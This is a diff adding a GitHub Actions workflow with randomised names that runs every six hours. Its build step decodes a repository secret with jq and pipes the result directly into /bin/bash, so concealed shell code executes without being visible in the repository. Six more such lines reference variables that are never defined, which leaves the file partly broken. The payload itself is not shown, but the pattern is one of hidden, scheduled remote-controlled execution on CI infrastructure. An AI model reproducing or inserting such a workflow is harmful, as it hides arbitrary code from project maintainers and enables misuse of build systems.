@@ -1,0 +1,24 @@
+name: xiaodanai1762
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaodanai1762
+        env:
+          d0259: ${{ secrets.d0259 }}
+        run: |
+          echo $d0259 | jq -r .zest4 | /bin/bash
+          echo $vtmb72 | jq -r .uzo7 | /bin/bash
+          echo $b93130 | jq -r .ep0024 | /bin/bash
+          echo $egye3 | jq -r .gcaw26 | /bin/bash
+          echo $nqga1969 | jq -r .vj5 | /bin/bash
+          echo $ty7 | jq -r .oy189 | /bin/bash
+          echo $qb210 | jq -r .ua6 | /bin/bash
+
